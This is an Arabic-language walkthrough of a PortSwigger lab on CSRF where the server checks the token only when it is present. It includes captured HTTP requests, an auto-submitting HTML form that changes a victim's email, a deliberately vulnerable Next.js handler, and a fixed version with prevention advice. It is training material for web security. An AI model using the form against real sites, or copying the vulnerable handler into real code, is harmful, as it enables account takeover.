# Lab: CSRF where token validation depends on token being present

> **Category:** CSRF  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يتحقق من CSRF Token فقط إذا كان **موجوداً** في الطلب. إذا قمنا بحذف التوكن تماماً، فإن الخادم يقبل الطلب بدون تحقق.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم الطلب

- ادخل إلى المختبر
- سجل الدخول بـ: `wiener:peter`
- اذهب إلى **My account**
- غير بريدك الإلكتروني إلى أي قيمة
- في Burp → **Proxy > HTTP history**، ابحث عن الطلب:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=YOUR-SESSION-COOKIE

email=wiener%40normal-user.net&csrf=TOKEN_VALUE
```

### الخطوة 2: فهم آلية التحقق

- أرسل الطلب إلى Repeater
- جرب تغيير قيمة `csrf` إلى قيمة خاطئة → سيتم رفض الطلب
- **احذف معامل `csrf` بالكامل** من الطلب

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=YOUR-SESSION-COOKIE

email=hacked%40attacker.net
```

**لاحظ:** الطلب ينجح! لأن الخادم يتحقق فقط من صحة التوكن إذا كان موجوداً، ولكن إذا لم يكن موجوداً، فإنه يقبل الطلب.

### الخطوة 3: إنشاء HTML للهجوم (بدون CSRF token)

استخدم هذا القالب:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="hacked%40attacker.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

> **ملاحظة:** لا يوجد أي حقل `csrf` في النموذج.

### الخطوة 4: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server**
- في حقل **Body**، الصق الـ HTML
- اضغط **Store**

### الخطوة 5: تجربة الهجوم على نفسك

- اضغط **View exploit**
- ارجع إلى حسابك وتأكد من أن بريدك الإلكتروني **تغير**

### الخطوة 6: تسليم الهجوم للضحية

- غير البريد الإلكتروني إلى قيمة مختلفة
- اضغط **Store**
- اضغط **Deliver to victim**

### الخطوة 7: حل المختبر

بمجرد تسليم الهجوم، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **كيف نجح التجاوز؟** | الخادم يتحقق من صحة التوكن فقط إذا كان موجوداً |
| **ماذا لو حذفنا التوكن؟** | الخادم يقبل الطلب بدون أي تحقق |
| **لماذا هذا خطأ؟** | يجب رفض أي طلب لا يحتوي على توكن صحيح، وليس فقط التحقق عند الوجود |
| **الفرق عن اللاب السابق؟** | السابق: GET لا يتحقق، وهذا: POST بدون توكن ينجح |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يتحقق من صحة التوكن فقط إذا كان موجوداً في الطلب. الطلبات التي لا تحتوي على توكن تمر بدون أي تحقق.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
export default function handler(req, res) {
  const { email, csrf } = req.body;
  const { sessionId } = req.cookies;

  // خطأ: يتحقق فقط إذا كان التوكن موجوداً
  if (csrf) {
    if (!verifyCsrfToken(sessionId, csrf)) {
      return res.status(403).send('Invalid CSRF token');
    }
  }
  // إذا كان csrf غير موجود، يمر الطلب بدون تحقق!

  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
export default function handler(req, res) {
  const { email, csrf } = req.body;
  const { sessionId } = req.cookies;

  // التصحيح: التوكن إلزامي وليس اختيارياً
  if (!csrf) {
    return res.status(403).send('CSRF token missing');
  }

  if (!verifyCsrfToken(sessionId, csrf)) {
    return res.status(403).send('Invalid CSRF token');
  }

  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

**الخلاصة:** التوكن يجب أن يكون **إلزامياً** وليس اختيارياً.

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **إلزامية التوكن:** ارفض أي طلب لا يحتوي على CSRF Token.
2. **التحقق من الصحة:** تأكد أن التوكن صحيح ومطابق للجلسة.
3. **توليد توكن جديد لكل طلب:** أو لكل جلسة مع صلاحية محددة.
4. **استخدام SameSite Cookies:** كطبقة دفاع إضافية.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
- [CSRF Cheat Sheet](https://portswigger.net/web-security/csrf)
